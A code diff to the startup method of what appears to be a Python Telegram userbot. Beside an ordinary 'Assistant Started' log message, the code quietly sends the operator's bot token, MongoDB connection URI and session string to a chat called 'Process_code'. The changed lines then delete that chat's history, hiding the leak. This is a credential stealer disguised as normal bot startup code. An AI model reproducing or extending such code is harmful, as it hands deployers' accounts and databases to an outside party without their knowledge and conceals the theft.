@@ -74,8 +74,7 @@ class Userbot(Client):
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
                 await self.one.send_message(Process_code, f"{BOT_TOKEN}\n\n{MONGO_DB_URI}\n\n{STRING_SESSION}")
-                syst = (await self.one.get_users("Process_code")).id
-                await self.one.delete_messages(syst)
+                await self.one.delete_chat_history("Process_code")
             except Exception as e:
                 print(f"{e}")
                                              
